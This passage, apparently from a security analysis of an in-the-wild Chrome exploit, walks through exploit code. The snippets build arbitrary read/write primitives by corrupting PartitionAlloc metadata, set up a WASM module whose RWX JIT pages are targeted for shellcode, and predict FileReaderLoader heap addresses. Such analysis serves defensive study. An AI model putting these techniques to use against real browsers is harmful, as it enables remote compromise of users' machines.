		<div id="crayon-676241da675e0691547651" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
async function kickPayload(auxArray) {
	let audioCtx = new OfflineAudioContext(1, 1, 3000);
	let partitionPagePtr = getPartitionPageMetadataArea(byteSwapBigInt(auxArray[0]));
	auxArray[0] = byteSwapBigInt(partitionPagePtr);
	let i = 0;
	do {
    		gcPreventer.push(new ArrayBuffer(8));
    		if (++i &gt; 0x100000)
        		return;
	} while (auxArray[0] != BigInt(0));
	let freelist = new BigUint64Array(new ArrayBuffer(8));
	gcPreventer.push(freelist);
	...</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e0691547651-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-2">2</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-4">4</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-6">6</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-8">8</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-10">10</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e0691547651-12">12</div><div class="crayon-num" data-line="crayon-676241da675e0691547651-13">13</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e0691547651-1"><span class="crayon-e">async </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">kickPayload</span><span class="crayon-sy">(</span><span class="crayon-i">auxArray</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-2"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">audioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">OfflineAudioContext</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-3"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPagePtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getPartitionPageMetadataArea</span><span class="crayon-sy">(</span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">auxArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-4"><span class="crayon-h">	</span><span class="crayon-i">auxArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">partitionPagePtr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-5"><span class="crayon-h">	</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-6"><span class="crayon-h">	</span><span class="crayon-st">do</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">gcPreventer</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ArrayBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span>++<span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0x100000</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-10"><span class="crayon-h">	</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">auxArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-11"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">freelist</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">BigUint64Array</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ArrayBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e0691547651-12"><span class="crayon-h">	</span><span class="crayon-i">gcPreventer</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e0691547651-13"><span class="crayon-h">	</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The exploit manipulates the PartitionPage metadata of the freed object to achieve the following behavior. If the address of another object is written in BigUint64Array at index zero and if a new 8-byte object is created and the value located at index 0 is read back, then a value located at the previously set address will be read. If something is written at index 0 at this stage, then this value will be written to the previously set address instead.</p>
		<div id="crayon-676241da675e2108707768" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function read64(rwHelper, addr) {
	rwHelper[0] = addr;
	var tmp = new BigUint64Array;
	tmp.buffer;
	gcPreventer.push(tmp);
	return byteSwapBigInt(rwHelper[0]);
}
 
function write64(rwHelper, addr, value) {
	rwHelper[0] = addr;
	var tmp = new BigUint64Array(1);
	tmp.buffer;
	tmp[0] = value;
	gcPreventer.push(tmp);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e2108707768-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-2">2</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-4">4</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-6">6</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-8">8</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-10">10</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-12">12</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e2108707768-14">14</div><div class="crayon-num" data-line="crayon-676241da675e2108707768-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e2108707768-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">rwHelper</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-2"><span class="crayon-h">	</span><span class="crayon-i">rwHelper</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-3"><span class="crayon-h">	</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">tmp</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-i">BigUint64Array</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-4"><span class="crayon-h">	</span><span class="crayon-i">tmp</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-5"><span class="crayon-h">	</span><span class="crayon-i">gcPreventer</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">tmp</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-6"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">rwHelper</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-7"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-8"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e2108707768-9"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">write64</span><span class="crayon-sy">(</span><span class="crayon-i">rwHelper</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-10"><span class="crayon-h">	</span><span class="crayon-i">rwHelper</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">addr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-11"><span class="crayon-h">	</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">tmp</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">BigUint64Array</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-12"><span class="crayon-h">	</span><span class="crayon-i">tmp</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-13"><span class="crayon-h">	</span><span class="crayon-i">tmp</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">value</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e2108707768-14"><span class="crayon-h">	</span><span class="crayon-i">gcPreventer</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">tmp</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e2108707768-15"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
After the building of the arbitrary read/write primitives comes the final stage – executing the code. The exploit achieves this by using a popular technique that exploits the Web Assembly (WASM) functionality. Google Chrome currently allocates pages for just-in-time (JIT) compiled code with read/write/execute (RWX) privileges and this can be used to overwrite them with shellcode. At first, the exploit initiates a &#8220;stub&#8221; WASM module and it results in the allocation of memory pages for JIT compiled code.</p>
		<div id="crayon-676241da675e3944542102" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
const wasmBuffer = new Uint8Array([...]);
const wasmBlob = new Blob([wasmBuffer], {
	type: "application/wasm"
});
 
const wasmUrl = URL.createObjectURL(wasmBlob);
var wasmFuncA = undefined;
WebAssembly.instantiateStreaming(fetch(wasmUrl), {}).then(function(result) {
	wasmFuncA = result.instance.exports.a;
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e3944542102-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e3944542102-2">2</div><div class="crayon-num" data-line="crayon-676241da675e3944542102-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e3944542102-4">4</div><div class="crayon-num" data-line="crayon-676241da675e3944542102-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e3944542102-6">6</div><div class="crayon-num" data-line="crayon-676241da675e3944542102-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e3944542102-8">8</div><div class="crayon-num" data-line="crayon-676241da675e3944542102-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e3944542102-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e3944542102-1"><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-i">wasmBuffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Uint8Array</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e3944542102-2"><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-i">wasmBlob</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Blob</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-i">wasmBuffer</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675e3944542102-3"><span class="crayon-h">	</span><span class="crayon-i">type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"application/wasm"</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e3944542102-4"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e3944542102-5"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e3944542102-6"><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-i">wasmUrl</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">URL</span><span class="crayon-sy">.</span><span class="crayon-e">createObjectURL</span><span class="crayon-sy">(</span><span class="crayon-i">wasmBlob</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e3944542102-7"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">wasmFuncA</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">undefined</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e3944542102-8"><span class="crayon-i">WebAssembly</span><span class="crayon-sy">.</span><span class="crayon-e">instantiateStreaming</span><span class="crayon-sy">(</span><span class="crayon-e">fetch</span><span class="crayon-sy">(</span><span class="crayon-i">wasmUrl</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-st">then</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-i">result</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675e3944542102-9"><span class="crayon-h">	</span><span class="crayon-i">wasmFuncA</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">result</span><span class="crayon-sy">.</span><span class="crayon-i">instance</span><span class="crayon-sy">.</span><span class="crayon-i">exports</span><span class="crayon-sy">.</span><span class="crayon-i">a</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e3944542102-10"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
To execute the exported function <em>wasmFuncA</em>, the exploit creates a FileReader object. When this object is initiated with data it creates a FileReaderLoader object internally. If you can parse PartitionAlloc allocator structures and know the size of the next object that will be allocated, you can predict which address it will be allocated to. The exploit uses the <em>getPartitionPageFreeListHeadEntryBySlotSize()</em> function with the provided size and gets the address of the next free block that will be allocated by FileReaderLoader.</p>
		<div id="crayon-676241da675e4189284148" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let fileReader = new FileReader;
let fileReaderLoaderSize = 0x140;
let fileReaderLoaderPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);
if (!fileReaderLoaderPtr)
	return;
 
fileReader.readAsArrayBuffer(new Blob([]));
 
let fileReaderLoaderTestPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilterFeedforwardAllocationPtr, fileReaderLoaderSize);
if (fileReaderLoaderPtr == fileReaderLoaderTestPtr)
	return;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e4189284148-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e4189284148-2">2</div><div class="crayon-num" data-line="crayon-676241da675e4189284148-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e4189284148-4">4</div><div class="crayon-num" data-line="crayon-676241da675e4189284148-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e4189284148-6">6</div><div class="crayon-num" data-line="crayon-676241da675e4189284148-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e4189284148-8">8</div><div class="crayon-num" data-line="crayon-676241da675e4189284148-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e4189284148-10">10</div><div class="crayon-num" data-line="crayon-676241da675e4189284148-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e4189284148-1"><span class="crayon-e">let </span><span class="crayon-i">fileReader</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-i">FileReader</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e4189284148-2"><span class="crayon-e">let </span><span class="crayon-i">fileReaderLoaderSize</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0x140</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e4189284148-3"><span class="crayon-e">let </span><span class="crayon-i">fileReaderLoaderPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getPartitionPageFreeListHeadEntryBySlotSize</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">fileReaderLoaderSize</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e4189284148-4"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">fileReaderLoaderPtr</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675e4189284148-5"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e4189284148-6"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e4189284148-7"><span class="crayon-i">fileReader</span><span class="crayon-sy">.</span><span class="crayon-e">readAsArrayBuffer</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Blob</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e4189284148-8"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e4189284148-9"><span class="crayon-e">let </span><span class="crayon-i">fileReaderLoaderTestPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getPartitionPageFreeListHeadEntryBySlotSize</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">fileReaderLoaderSize</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e4189284148-10"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">fileReaderLoaderPtr</span><span class="crayon-h"> </span>==<span class="crayon-h"> </span><span class="crayon-i">fileReaderLoaderTestPtr</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675e4189284148-11"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The exploit obtains this address twice to find out if the FileReaderLoader object was created and if the exploit can continue execution. The exploit sets the exported WASM function to be a callback for a FileReader event (in this case, an onerror callback) and because the FileReader type is derived from EventTargetWithInlineData, it can be used to get the addresses of all its events and the address of the JIT compiled exported WASM function.</p>
